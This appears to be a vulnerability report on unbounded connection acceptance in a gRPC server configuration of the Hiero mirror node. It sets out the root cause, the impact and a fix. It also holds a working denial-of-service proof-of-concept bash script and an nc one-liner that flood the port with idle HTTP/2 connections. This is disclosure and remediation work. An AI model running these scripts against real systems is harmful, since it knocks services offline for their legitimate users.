### Title
Unbounded gRPC Connection Acceptance Enables File Descriptor Exhaustion DoS

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures `NettyServerBuilder` with only a per-connection call limit (`maxConcurrentCallsPerConnection = 5`) but sets no global cap on the total number of simultaneous inbound TCP connections. An unprivileged attacker can open thousands of idle TCP connections to the gRPC port, exhausting the JVM process's OS file descriptors and preventing any further legitimate connections from being accepted.

### Finding Description
**Exact code path:**
`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35.

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    // ← No maxConnectionAge(), maxConnectionIdle(), or maxInboundConnections()
};
```

`NettyProperties` (lines 11–14) exposes only `maxConcurrentCallsPerConnection = 5`. No other Netty-level connection controls exist anywhere in the `grpc/` module.

**Root cause:** `maxConcurrentCallsPerConnection` limits the number of concurrent HTTP/2 streams *within* a single connection. It does not limit how many distinct TCP connections the server will accept. `NettyServerBuilder` provides `maxConnectionAge()`, `maxConnectionIdle()`, and (Netty gRPC ≥ 1.60) `maxInboundConnections()` for this purpose — none are called.

**Exploit flow:**
1. Attacker opens a raw TCP socket to port 5600 and sends the HTTP/2 client preface (`PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n`) to complete the Netty handshake and keep the connection alive.
2. Attacker repeats this in a tight loop from one or more hosts (no authentication required; gRPC port is public).
3. Each accepted connection consumes one OS file descriptor in the JVM process.
4. When the process hits its `ulimit -n` ceiling (commonly 1024–65535 depending on deployment), `accept()` fails with `EMFILE`/`ENFILE`.
5. All subsequent legitimate client connections are refused at the TCP layer.

**Why the existing check is insufficient:** `maxConcurrentCallsPerConnection = 5` only rejects a 6th *stream* on an already-established connection. It does nothing to prevent a new connection from being established in the first place.

### Impact Explanation
Complete denial of service for the gRPC API. No legitimate client — including Hedera SDK users querying topic messages or address book data — can open a new connection once file descriptors are exhausted. Because the gRPC service is a read path for mirror node data, this also indirectly disrupts any downstream system that depends on it. Severity: **High** (availability impact, no authentication required, no data corruption but full service outage).

### Likelihood Explanation
Any external user with network access to port 5600 can execute this attack. No credentials, no special protocol knowledge beyond sending the 24-byte HTTP/2 preface, and no rate limiting or IP-based throttling exists at the application layer. The attack is trivially scriptable (`for i in $(seq 10000); do nc -q0 host 5600 & done`), repeatable, and requires no sustained bandwidth — idle connections cost essentially zero attacker resources while each consumes a server file descriptor.

### Recommendation
Add the following to `grpcServerConfigurer()` in `GrpcConfiguration.java`:

```java
serverBuilder.maxConnectionAge(nettyProperties.getMaxConnectionAge(), TimeUnit.SECONDS);
serverBuilder.maxConnectionIdle(nettyProperties.getMaxConnectionIdle(), TimeUnit.SECONDS);
// Netty gRPC ≥ 1.60:
serverBuilder.maxInboundConnections(nettyProperties.getMaxInboundConnections());
```

Expose these as new fields in `NettyProperties` with safe defaults (e.g., `maxConnectionAge = 300s`, `maxConnectionIdle = 60s`, `maxInboundConnections = 1000`). Additionally, enforce OS-level `ulimit` headroom and consider a load-balancer/ingress connection limit as a defense-in-depth layer.

### Proof of Concept
```bash
# Requires only bash + /dev/tcp or netcat; no gRPC tooling needed
H2_PREFACE=$'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
TARGET_HOST=<grpc-host>
TARGET_PORT=5600
CONNECTIONS=5000

for i in $(seq 1 $CONNECTIONS); do
  # Open TCP connection, send HTTP/2 preface, leave open in background
  (echo -ne "$H2_PREFACE"; sleep 3600) | nc -q -1 $TARGET_HOST $TARGET_PORT &
done

# Verify: attempt a legitimate gRPC call after the above
grpcurl -plaintext $TARGET_HOST:$TARGET_PORT list
# Expected result after fd exhaustion: "Failed to dial target host ... connection refused" or timeout
```

Each background `nc` process holds one file descriptor open on the server side. After `$CONNECTIONS` iterations (tune to the server's `ulimit -n`), the server can no longer call `accept()` and all new connections — including legitimate ones — are dropped.
